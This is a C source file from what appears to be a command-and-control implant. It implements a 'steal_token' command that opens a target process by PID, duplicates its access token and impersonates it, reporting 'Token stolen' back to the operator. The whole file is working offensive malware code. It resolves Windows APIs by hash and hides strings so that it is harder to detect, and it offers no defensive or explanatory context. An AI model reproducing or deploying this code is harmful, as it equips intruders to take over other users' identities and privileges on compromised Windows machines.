#include "config.h"
#ifdef INCLUDE_CMD_STEAL_TOKEN

#include "commands.h"
#include "common.h"

typedef BOOL (WINAPI *fn_OpenProcessToken)(HANDLE, DWORD, PHANDLE);
typedef BOOL (WINAPI *fn_DuplicateTokenEx)(HANDLE, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, PHANDLE);
typedef BOOL (WINAPI *fn_ImpersonateLoggedOnUser)(HANDLE);

#define TOKEN_DUPLICATE          0x0002
#define TOKEN_QUERY              0x0008
#define TOKEN_IMPERSONATE        0x0004
#define SecurityImpersonation    2
#define TOKEN_TYPE_IMPERSONATION 2

// steal_token <pid>: duplicate the primary token of a process and impersonate it
VOID cmd_steal_token(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    DWORD pid = parser_int32(args);
    if (pid == 0) {
        package_add_string(inst, response, XSTR("No PID specified"));
        response->is_error = TRUE;
        return;
    }

    xstr(_adv, "advapi32.dll");
    HMODULE h_adv = inst->Win32.LoadLibraryA(_adv);
    if (!h_adv) {
        package_add_string(inst, response, XSTR("advapi32 load failed"));
        response->is_error = TRUE;
        return;
    }
    fn_OpenProcessToken pOpenProcessToken = (fn_OpenProcessToken)resolve_function((PVOID)h_adv, hash_string_djb2(XSTR("OpenProcessToken")));
    fn_DuplicateTokenEx pDuplicateTokenEx = (fn_DuplicateTokenEx)resolve_function((PVOID)h_adv, hash_string_djb2(XSTR("DuplicateTokenEx")));
    fn_ImpersonateLoggedOnUser pImpersonate = (fn_ImpersonateLoggedOnUser)resolve_function((PVOID)h_adv, hash_string_djb2(XSTR("ImpersonateLoggedOnUser")));
    if (!pOpenProcessToken || !pDuplicateTokenEx || !pImpersonate) {
        package_add_string(inst, response, XSTR("advapi32 API resolve failed"));
        response->is_error = TRUE;
        return;
    }

    HANDLE h_proc = inst->Win32.OpenProcess((DWORD)0x0400 /*PROCESS_DUP_HANDLE*/ | (DWORD)0x0800 /*PROCESS_QUERY_INFORMATION*/, FALSE, pid);
    if (!h_proc) {
        package_add_string(inst, response, XSTR("OpenProcess failed"));
        response->is_error = TRUE;
        return;
    }

    HANDLE h_token = NULL;
    if (!pOpenProcessToken(h_proc, TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &h_token)) {
        gate_CloseHandle(inst, h_proc);
        package_add_string(inst, response, XSTR("OpenProcessToken failed"));
        response->is_error = TRUE;
        return;
    }

    HANDLE h_dup = NULL;
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    if (!pDuplicateTokenEx(h_token, TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_DUPLICATE,
                           &sa, SecurityImpersonation, TOKEN_TYPE_IMPERSONATION, &h_dup)) {
        gate_CloseHandle(inst, h_token);
        gate_CloseHandle(inst, h_proc);
        package_add_string(inst, response, XSTR("DuplicateTokenEx failed"));
        response->is_error = TRUE;
        return;
    }

    if (!pImpersonate(h_dup)) {
        gate_CloseHandle(inst, h_dup);
        gate_CloseHandle(inst, h_token);
        gate_CloseHandle(inst, h_proc);
        package_add_string(inst, response, XSTR("ImpersonateLoggedOnUser failed"));
        response->is_error = TRUE;
        return;
    }

    if (inst->ImpersonationToken) gate_CloseHandle(inst, inst->ImpersonationToken);
    inst->ImpersonationToken = h_dup;

    gate_CloseHandle(inst, h_token);
    gate_CloseHandle(inst, h_proc);

    package_add_string(inst, response, XSTR("Token stolen"));
}

#endif
